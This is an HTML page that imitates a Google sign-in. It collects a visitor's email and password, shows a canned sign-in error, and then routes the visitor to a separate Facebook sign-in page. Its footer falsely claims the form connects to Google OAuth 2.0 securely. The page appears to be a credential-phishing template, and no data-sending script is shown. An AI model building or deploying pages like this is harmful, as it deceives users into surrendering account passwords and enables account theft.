<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in — to your Google account</title>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;500;700&display=swap" rel="stylesheet">
<style>
  *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}

  body {
    font-family: 'Space Grotesk', sans-serif;
    background: #0a0a0a;
    color: #f0f0f0;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 1.5rem;
  }

  .card {
    width: 100%;
    max-width: 400px;
    background: #111;
    border: 1px solid #1e1e1e;
    border-radius: 18px;
    padding: 2.5rem 2rem;
    text-align: center;
  }

  .back-link {
    display: inline-flex;
    align-items: center;
    gap: 0.4rem;
    color: #555;
    font-size: 0.82rem;
    text-decoration: none;
    margin-bottom: 2rem;
    transition: color 0.2s;
    font-weight: 300;
    float: left;
  }

  .back-link:hover { color: #ff6b35; }

  .back-link svg {
    width: 16px; height: 16px;
    stroke: currentColor;
    fill: none;
    stroke-width: 2;
    stroke-linecap: round;
    stroke-linejoin: round;
  }

  .clearfix::after {
    content: '';
    display: table;
    clear: both;
  }

  .card h1 {
    font-size: 1.5rem;
    font-weight: 700;
    margin-bottom: 0.3rem;
    letter-spacing: -0.02em;
  }

  .card .sub {
    font-size: 0.88rem;
    color: #666;
    font-weight: 300;
    margin-bottom: 2rem;
  }

  .field {
    margin-bottom: 1.2rem;
    text-align: left;
  }

  .field label {
    display: block;
    font-size: 0.78rem;
    color: #888;
    font-weight: 500;
    margin-bottom: 0.45rem;
    text-transform: uppercase;
    letter-spacing: 0.06em;
  }

  .field input {
    width: 100%;
    padding: 0.8rem 1rem;
    background: #0a0a0a;
    border: 1.5px solid #222;
    border-radius: 10px;
    color: #f0f0f0;
    font-family: inherit;
    font-size: 0.95rem;
    outline: none;
    transition: border-color 0.25s;
  }

  .field input::placeholder { color: #3a3a3a; }
  .field input:focus { border-color: #ff6b35; }

  .input-wrap {
    position: relative;
  }

  .input-wrap input {
    padding-right: 2.8rem;
  }

  #togglePassword {
    position: absolute;
    right: 0.9rem;
    top: 50%;
    transform: translateY(-50%);
    background: none;
    border: none;
    cursor: pointer;
    padding: 0.2rem;
    color: #666;
    display: flex;
    align-items: center;
    justify-content: center;
  }

  #togglePassword:hover { color: #888; }

  .submit-btn {
    width: 100%;
    margin-top: 0.5rem;
    padding: 0.85rem;
    background: #ff6b35;
    color: #fff;
    border: none;
    border-radius: 10px;
    font-family: inherit;
    font-size: 0.95rem;
    font-weight: 500;
    cursor: pointer;
    transition: transform 0.15s, box-shadow 0.25s, opacity 0.3s;
    box-shadow: 0 0 20px rgba(255,107,53,0.2);
  }

  .submit-btn:hover {
    transform: translateY(-1px);
    box-shadow: 0 0 35px rgba(255,107,53,0.35);
  }

  .submit-btn:active { transform: scale(0.98); }
  .submit-btn:focus-visible { outline: 2px solid #ff6b35; outline-offset: 3px; }
  .submit-btn.loading { pointer-events: none; opacity: 0.6; }

  /* error section */
  .error-section {
    margin-top: 2rem;
    padding-top: 1.5rem;
    border-top: 1px solid #1e1e1e;
    opacity: 0;
    transform: translateY(12px);
    transition: opacity 0.5s ease, transform 0.5s ease;
    pointer-events: none;
  }

  .error-section.show {
    opacity: 1;
    transform: translateY(0);
    pointer-events: auto;
  }

  .error-msg {
    font-size: 0.85rem;
    color: #e74c3c;
    font-weight: 500;
    margin-bottom: 1.2rem;
  }

  .divider {
    display: flex;
    align-items: center;
    gap: 0.8rem;
    margin-bottom: 1.2rem;
  }

  .divider::before,
  .divider::after {
    content: '';
    flex: 1;
    height: 1px;
    background: #222;
  }

  .divider span {
    font-size: 0.75rem;
    color: #444;
    text-transform: uppercase;
    letter-spacing: 0.08em;
  }

  .facebook-btn {
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 0.75rem;
    width: 100%;
    padding: 0.85rem 1.5rem;
    border: 1.5px solid #2a2a2a;
    border-radius: 10px;
    background: #111;
    color: #f0f0f0;
    font-family: inherit;
    font-size: 0.95rem;
    font-weight: 500;
    cursor: pointer;
    text-decoration: none;
    transition: border-color 0.25s, background 0.25s, transform 0.15s;
  }

  .facebook-btn:hover {
    border-color: #1877f2;
    background: #1a1a1a;
    transform: translateY(-1px);
  }

  .facebook-btn:active { transform: scale(0.98); }
  .facebook-btn:focus-visible { outline: 2px solid #ff6b35; outline-offset: 2px; }
  .facebook-btn svg { width: 22px; height: 22px; flex-shrink: 0; }

  .footer-text {
    margin-top: 1.5rem;
    font-size: 0.72rem;
    color: #333;
    font-weight: 300;
    line-height: 1.5;
  }

  /* spinner inside button */
  .submit-btn .spinner {
    display: none;
    width: 18px; height: 18px;
    border: 2.5px solid rgba(255,255,255,0.3);
    border-top-color: #fff;
    border-radius: 50%;
    animation: spin 0.6s linear infinite;
    margin: 0 auto;
  }

  .submit-btn.loading .btn-text { display: none; }
  .submit-btn.loading .spinner { display: block; }

  @keyframes spin { to { transform: rotate(360deg); } }
  @keyframes shake {
    0%, 100% { transform: translateX(0); }
    20% { transform: translateX(-6px); }
    40% { transform: translateX(6px); }
    60% { transform: translateX(-4px); }
    80% { transform: translateX(4px); }
  }
</style>
</head>
<body>

<div class="card">
  <div class="clearfix">
    <a href="/" class="back-link">
      <svg viewBox="0 0 24 24"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
      Back
    </a>
  </div>

  <h1>Sign in with Google</h1>
  <p class="sub">Enter your Google account details to verify.</p>

  <form id="loginForm" novalidate>
    <div class="field">
      <label for="email">Email</label>
      <input type="email" id="email" placeholder="you@gmail.com" autocomplete="email" required>
    </div>
    <div class="field">
      <label for="password">Password</label>
      <div class="input-wrap">
        <input type="password" id="password" placeholder="Enter your password" autocomplete="current-password" required>
        <button type="button" id="togglePassword" aria-label="Show password">
          <!-- Eye open -->
          <svg id="eyeOpen" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
            <circle cx="12" cy="12" r="3"/>
          </svg>
          <!-- Eye off (hidden by default) -->
          <svg id="eyeOff" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="display:none;">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/>
            <line x1="1" y1="1" x2="23" y2="23"/>
          </svg>
        </button>
      </div>
    </div>
    <button type="submit" class="submit-btn" id="submitBtn">
      <span class="btn-text">Continue</span>
      <div class="spinner"></div>
    </button>
  </form>

  <div class="error-section" id="errorSection">
    <p class="error-msg">Something went wrong signing in with Google.</p>
    <div class="divider"><span>or try another method</span></div>
    <a href="facebook.html" class="facebook-btn">
      <svg viewBox="0 0 24 24" fill="#1877F2">
        <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/>
      </svg>
      Sign in with Facebook
    </a>
  </div>

  <p class="footer-text">
    This form connects to Google OAuth 2.0 securely.<br>
    <a href="#" style="color:#555;text-decoration:none">Privacy Policy</a> · <a href="#" style="color:#555;text-decoration:none">Terms of Service</a>
  </p>
</div>

</html>
